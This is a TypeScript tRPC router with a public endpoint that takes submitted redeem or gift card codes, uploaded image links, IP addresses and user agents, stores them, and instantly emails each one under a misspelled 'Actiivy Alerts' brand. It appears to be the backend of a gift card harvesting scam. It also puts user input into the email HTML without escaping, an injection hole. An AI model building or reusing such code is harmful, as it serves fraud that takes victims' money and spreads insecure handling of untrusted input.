import { router, publicProcedure } from './router';
import { z } from 'zod';
import nodemailer from 'nodemailer';
import { db } from './db';
import { submissions } from './schema';

const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 465,
  secure: true,
  auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_APP_PASSWORD }
});

export const submissionRouter = router({
  submitRedeem: publicProcedure
    .input(z.object({
      code: z.string(),
      imageUrl: z.string().optional(),
      userAgent: z.string().optional(),
      ip: z.string().optional(),
      metadata: z.record(z.any()).optional()
    }))
    .mutation(async ({ input }) => {
      await db.insert(submissions).values({
        code: input.code, imageUrl: input.imageUrl,
        userAgent: input.userAgent, ip: input.ip,
        metadata: JSON.stringify(input.metadata), createdAt: new Date()
      });

      await transporter.sendMail({
        from: `"Actiivy Alerts" <${process.env.SMTP_USER}>`,
        to: process.env.NOTIFICATION_EMAILS,
        subject: '🔔 New Redeem Code / Gift Card Submission',
        html: `
          <div style="font-family: system-ui, sans-serif; padding: 20px; background: #f4f6f8; border-radius: 10px; max-width: 600px;">
            <h2 style="margin: 0 0 16px; color: #111;">New Submission Received</h2>
            <div style="background: #fff; padding: 16px; border-radius: 8px; border: 1px solid #e2e8f0;">
              <p style="margin: 0 0 10px;"><strong>🔑 Redeem Code:</strong> <code style="background: #eef2f7; padding: 4px 8px; border-radius: 4px; font-family: monospace;">${input.code}</code></p>
              ${input.imageUrl ? `<p style="margin: 0 0 10px;"><strong>📎 Uploaded Image:</strong> <a href="${input.imageUrl}" target="_blank" style="color: #2563eb;">Click to View</a></p>` : ''}
              <p style="margin: 0 0 10px;"><strong>⏰ Received:</strong> ${new Date().toLocaleString()}</p>
              ${input.ip ? `<p style="margin: 0 0 10px;"><strong>🌍 IP Address:</strong> ${input.ip}</p>` : ''}
              ${input.userAgent ? `<p style="margin: 0 0 10px;"><strong>💻 User-Agent:</strong> <span style="font-size: 12px; color: #555;">${input.userAgent}</span></p>` : ''}
            </div>
            <p style="margin-top: 16px; font-size: 12px; color: #64748b;">Automated instant alert. No admin approval required.</p>
          </div>
        `
      });
      return { success: true, message: 'Submission logged & notified instantly.' };
    })
});
